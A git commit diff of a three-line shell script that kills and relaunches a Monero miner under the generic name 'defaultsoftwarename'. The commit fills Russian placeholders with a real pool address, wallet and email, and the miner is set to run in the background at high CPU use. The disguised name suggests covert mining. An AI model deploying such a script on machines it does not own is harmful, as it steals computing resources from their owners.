eaf01405333babe882d5826a00d8b7437e86690d
minipodval <59120761+minipodval@users.noreply.github.com>
2019-12-21 21:24:42 +0300

    Update 4.sh

--- 4.sh
+++ 4.sh
@@ -1,3 +1,3 @@
 pkill defaultsoftwarename
 sleep 7
-defaultsoftwarename -o ВАШ ИП:ПОРТ -u ВАШ КОШЕЛЁК МОНЕРО --pass=x:ВАША ПОЧТА --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=90 --av=1
+defaultsoftwarename -o 51.89.203.219:49228 -u 4BEvVKWjxwhftQpvBpbvDGj4Gc9moSHpUW7fjKMfxKzFg9avfEhHLModzVg3AX4FjGQ9WY74vsVixLTqdSMyHrNvMnSXC21 --pass=x:mini.podval@gmail.com --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=90 --av=1
